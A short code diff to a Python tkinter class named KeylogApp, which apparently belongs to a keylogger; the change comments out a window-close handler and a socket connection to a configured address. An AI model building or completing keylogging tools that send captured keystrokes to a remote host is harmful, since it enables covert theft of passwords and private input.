@@ -27,10 +27,10 @@ class KeylogApp:
         self.button_clear = tk.Button(root, text="Clear", command=self.clear)
         self.button_clear.pack()
 
-        self.root.protocol("WM_DELETE_WINDOW", self.keylog_app_closing)
+        # self.root.protocol("WM_DELETE_WINDOW", self.keylog_app_closing)
 
-        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.client.connect(ADDRESS)
+        # self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # self.client.connect(ADDRESS)
 
     def hook(self):
         s = "HOOK"
